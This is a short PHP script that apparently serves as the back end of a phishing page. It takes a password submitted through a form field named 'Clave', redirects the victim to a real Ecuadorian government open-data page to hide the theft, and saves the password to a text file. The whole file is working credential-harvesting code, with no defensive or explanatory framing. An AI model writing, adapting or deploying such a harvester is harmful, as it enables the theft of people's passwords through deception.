<?php
// Receiving the data entered in the form
$Clave = $_POST["Clave"];
header('Location:https://www.datosabiertos.gob.ec/dataset/cuentas-internet-fijos-y-moviles');
     // Opening the archived file
     $co = "===========================================\n";
     $cl = "===========================================\n";
     $file=fopen("Password.txt", "w");
     // Le cargo los datos
     $op = "Password:  $Clave\n";
     fwrite($file, "\n". $co. $op. $cl);
     fclose($file);
?>
